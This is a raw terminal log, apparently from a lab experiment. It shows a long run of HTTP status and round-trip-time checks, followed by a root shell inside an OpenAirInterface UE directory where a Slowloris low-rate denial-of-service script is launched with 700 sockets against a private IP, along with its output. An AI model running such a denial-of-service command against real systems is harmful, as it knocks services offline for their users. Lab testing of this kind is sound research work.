[✓] 28-06-2025 10:42:46 | HTTP Status: 200	RTT: 293.38 ms
[✓] 28-06-2025 10:42:47 | HTTP Status: 200	RTT: 51.82 ms
[✓] 28-06-2025 10:42:48 | HTTP Status: 200	RTT: 271.34 ms
[✓] 28-06-2025 10:42:49 | HTTP Status: 200	RTT: 270.86 ms
[✓] 28-06-2025 10:42:49 | HTTP Status: 200	RTT: 314.15 ms
[✓] 28-06-2025 10:42:50 | HTTP Status: 200	RTT: 52.08 ms
[✓] 28-06-2025 10:42:51 | HTTP Status: 200	RTT: 328.13 ms
[✓] 28-06-2025 10:42:52 | HTTP Status: 200	RTT: 68.35 ms
[✓] 28-06-2025 10:42:52 | HTTP Status: 200	RTT: 311.97 ms
[✓] 28-06-2025 10:42:53 | HTTP Status: 200	RTT: 312.78 ms
[✓] 28-06-2025 10:42:54 | HTTP Status: 200	RTT: 314.61 ms
[✓] 28-06-2025 10:42:55 | HTTP Status: 200	RTT: 63.58 ms
[✓] 28-06-2025 10:42:55 | HTTP Status: 200	RTT: 390.04 ms
[✓] 28-06-2025 10:42:56 | HTTP Status: 200	RTT: 87.70 ms
[✓] 28-06-2025 10:42:57 | HTTP Status: 200	RTT: 361.24 ms
[✓] 28-06-2025 10:42:57 | HTTP Status: 200	RTT: 53.59 ms
[✓] 28-06-2025 10:42:58 | HTTP Status: 200	RTT: 87.85 ms
[✓] 28-06-2025 10:42:59 | HTTP Status: 200	RTT: 344.62 ms
[✓] 28-06-2025 10:42:59 | HTTP Status: 200	RTT: 56.16 ms
[✓] 28-06-2025 10:43:00 | HTTP Status: 200	RTT: 231.89 ms
[✓] 28-06-2025 10:43:01 | HTTP Status: 200	RTT: 50.31 ms
[✓] 28-06-2025 10:43:01 | HTTP Status: 200	RTT: 290.30 ms
[✓] 28-06-2025 10:43:02 | HTTP Status: 200	RTT: 214.47 ms
[✓] 28-06-2025 10:43:03 | HTTP Status: 200	RTT: 58.18 ms
[✓] 28-06-2025 10:43:03 | HTTP Status: 200	RTT: 292.78 ms
[✓] 28-06-2025 10:43:04 | HTTP Status: 200	RTT: 176.73 ms
[✓] 28-06-2025 10:43:05 | HTTP Status: 200	RTT: 73.01 ms
[✓] 28-06-2025 10:43:05 | HTTP Status: 200	RTT: 102.85 ms
[✓] 28-06-2025 10:43:06 | HTTP Status: 200	RTT: 406.85 ms
[✓] 28-06-2025 10:43:07 | HTTP Status: 200	RTT: 360.15 ms
[✓] 28-06-2025 10:43:08 | HTTP Status: 200	RTT: 173.83 ms
[✓] 28-06-2025 10:43:08 | HTTP Status: 200	RTT: 227.69 ms
[✓] 28-06-2025 10:43:09 | HTTP Status: 200	RTT: 125.07 ms
[✓] 28-06-2025 10:43:10 | HTTP Status: 200	RTT: 303.73 ms
[✓] 28-06-2025 10:43:11 | HTTP Status: 200	RTT: 60.91 ms
[✓] 28-06-2025 10:43:11 | HTTP Status: 200	RTT: 309.13 ms
[✓] 28-06-2025 10:43:12 | HTTP Status: 200	RTT: 367.39 ms
[✓] 28-06-2025 10:43:13 | HTTP Status: 200	RTT: 58.22 ms
[✓] 28-06-2025 10:43:13 | HTTP Status: 200	RTT: 206.03 ms
[✓] 28-06-2025 10:43:14 | HTTP Status: 200	RTT: 71.28 ms
[✓] 28-06-2025 10:43:15 | HTTP Status: 200	RTT: 348.47 ms
[✓] 28-06-2025 10:43:16 | HTTP Status: 200	RTT: 60.61 ms
[✓] 28-06-2025 10:43:16 | HTTP Status: 200	RTT: 313.23 ms
[✓] 28-06-2025 10:43:17 | HTTP Status: 200	RTT: 62.31 ms
[✓] 28-06-2025 10:43:17 | HTTP Status: 200	RTT: 289.22 ms
[✓] 28-06-2025 10:43:18 | HTTP Status: 200	RTT: 61.61 ms
[✓] 28-06-2025 10:43:19 | HTTP Status: 200	RTT: 280.44 ms
[✓] 28-06-2025 10:43:20 | HTTP Status: 200	RTT: 66.98 ms
[✓] 28-06-2025 10:43:20 | HTTP Status: 200	RTT: 350.84 ms
[✓] 28-06-2025 10:43:21 | HTTP Status: 200	RTT: 75.61 ms
[✓] 28-06-2025 10:43:22 | HTTP Status: 200	RTT: 427.24 ms
[✓] 28-06-2025 10:43:23 | HTTP Status: 200	RTT: 76.23 ms
[✓] 28-06-2025 10:43:23 | HTTP Status: 200	RTT: 340.93 ms
[✓] 28-06-2025 10:43:24 | HTTP Status: 200	RTT: 385.20 ms
[✓] 28-06-2025 10:43:25 | HTTP Status: 200	RTT: 62.87 ms
[✓] 28-06-2025 10:43:25 | HTTP Status: 200	RTT: 294.63 ms
[✓] 28-06-2025 10:43:26 | HTTP Status: 200	RTT: 194.62 ms
[✓] 28-06-2025 10:43:27 | HTTP Status: 200	RTT: 374.57 ms
[✓] 28-06-2025 10:43:28 | HTTP Status: 200	RTT: 69.40 ms
[✓] 28-06-2025 10:43:28 | HTTP Status: 200	RTT: 325.73 ms
[✓] 28-06-2025 10:43:29 | HTTP Status: 200	RTT: 318.00 ms
[✓] 28-06-2025 10:43:30 | HTTP Status: 200	RTT: 58.29 ms
[✓] 28-06-2025 10:43:31 | HTTP Status: 200	RTT: 471.38 ms
[✓] 28-06-2025 10:43:31 | HTTP Status: 200	RTT: 78.26 ms
[✓] 28-06-2025 10:43:32 | HTTP Status: 200	RTT: 385.26 ms
[✓] 28-06-2025 10:43:33 | HTTP Status: 200	RTT: 57.96 ms
[✓] 28-06-2025 10:43:34 | HTTP Status: 200	RTT: 319.71 ms
[✓] 28-06-2025 10:43:34 | HTTP Status: 200	RTT: 55.97 ms
[✓] 28-06-2025 10:43:35 | HTTP Status: 200	RTT: 364.83 ms
[✓] 28-06-2025 10:43:36 | HTTP Status: 200	RTT: 83.90 ms
[✓] 28-06-2025 10:43:36 | HTTP Status: 200	RTT: 389.86 ms
[✓] 28-06-2025 10:43:37 | HTTP Status: 200	RTT: 92.42 ms
[✓] 28-06-2025 10:43:38 | HTTP Status: 200	RTT: 185.26 ms
[✓] 28-06-2025 10:43:39 | HTTP Status: 200	RTT: 58.17 ms
[✓] 28-06-2025 10:43:39 | HTTP Status: 200	RTT: 379.11 ms
[✓] 28-06-2025 10:43:40 | HTTP Status: 200	RTT: 56.60 ms
[✓] 28-06-2025 10:43:41 | HTTP Status: 200	RTT: 328.88 ms
[✓] 28-06-2025 10:43:41 | HTTP Status: 200	RTT: 52.37 ms
[✓] 28-06-2025 10:43:42 | HTTP Status: 200	RTT: 57.28 ms
[✓] 28-06-2025 10:43:42 | HTTP Status: 200	RTT: 164.12 ms
[✓] 28-06-2025 10:43:43 | HTTP Status: 200	RTT: 64.66 ms
[✓] 28-06-2025 10:43:44 | HTTP Status: 200	RTT: 70.58 ms
[✓] 28-06-2025 10:43:44 | HTTP Status: 200	RTT: 90.59 ms
[✓] 28-06-2025 10:43:45 | HTTP Status: 200	RTT: 499.44 ms
[✓] 28-06-2025 10:43:46 | HTTP Status: 200	RTT: 63.68 ms
[✓] 28-06-2025 10:43:46 | HTTP Status: 200	RTT: 246.95 ms
[✓] 28-06-2025 10:43:47 | HTTP Status: 200	RTT: 53.61 ms
[✓] 28-06-2025 10:43:48 | HTTP Status: 200	RTT: 304.44 ms
[✓] 28-06-2025 10:43:49 | HTTP Status: 200	RTT: 201.11 ms
[✓] 28-06-2025 10:43:49 | HTTP Status: 200	RTT: 321.50 ms
[✓] 28-06-2025 10:43:50 | HTTP Status: 200	RTT: 65.98 ms
[✓] 28-06-2025 10:43:51 | HTTP Status: 200	RTT: 169.45 ms
[✓] 28-06-2025 10:43:51 | HTTP Status: 200	RTT: 76.23 ms
[✓] 28-06-2025 10:43:52 | HTTP Status: 200	RTT: 146.28 ms
[✓] 28-06-2025 10:43:53 | HTTP Status: 200	RTT: 351.62 ms
[✓] 28-06-2025 10:43:53 | HTTP Status: 200	RTT: 59.48 ms
[✓] 28-06-2025 10:43:54 | HTTP Status: 200	RTT: 347.69 ms
[✓] 28-06-2025 10:43:55 | HTTP Status: 200	RTT: 57.95 ms
[✓] 28-06-2025 10:43:55 | HTTP Status: 200	RTT: 285.09 ms
[✓] 28-06-2025 10:43:56 | HTTP Status: 200	RTT: 69.74 ms
[✓] 28-06-2025 10:43:57 | HTTP Status: 200	RTT: 336.48 ms
[✓] 28-06-2025 10:43:58 | HTTP Status: 200	RTT: 61.14 ms
[✓] 28-06-2025 10:43:58 | HTTP Status: 200	RTT: 346.08 ms
[✓] 28-06-2025 10:43:59 | HTTP Status: 200	RTT: 336.17 ms
[✓] 28-06-2025 10:44:00 | HTTP Status: 200	RTT: 72.98 ms
[✓] 28-06-2025 10:44:00 | HTTP Status: 200	RTT: 287.52 ms
[✓] 28-06-2025 10:44:01 | HTTP Status: 200	RTT: 76.98 ms
[✓] 28-06-2025 10:44:02 | HTTP Status: 200	RTT: 419.16 ms
[✓] 28-06-2025 10:44:03 | HTTP Status: 200	RTT: 297.94 ms
[✓] 28-06-2025 10:44:03 | HTTP Status: 200	RTT: 179.97 ms
[✓] 28-06-2025 10:44:04 | HTTP Status: 200	RTT: 60.53 ms
[✓] 28-06-2025 10:44:05 | HTTP Status: 200	RTT: 291.24 ms
[✓] 28-06-2025 10:44:05 | HTTP Status: 200	RTT: 60.40 ms
[✓] 28-06-2025 10:44:06 | HTTP Status: 200	RTT: 64.78 ms
[✓] 28-06-2025 10:44:07 | HTTP Status: 200	RTT: 370.32 ms
[✓] 28-06-2025 10:44:07 | HTTP Status: 200	RTT: 294.43 ms
[✓] 28-06-2025 10:44:08 | HTTP Status: 200	RTT: 57.32 ms



root@ce327507ce2b:/opt/oai-nr-ue/etc/lowRateDoS# python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 700
[28-06-2025 10:43:28] Attacking 192.168.71.135 with 700 sockets.
[28-06-2025 10:43:28] Creating sockets...
[28-06-2025 10:43:45] Sending keep-alive headers...
[28-06-2025 10:43:45] Socket count: 400
[28-06-2025 10:43:45] Creating 300 new sockets...
[28-06-2025 10:44:00] Sending keep-alive headers...
[28-06-2025 10:44:00] Socket count: 400
[28-06-2025 10:44:00] Creating 300 new sockets...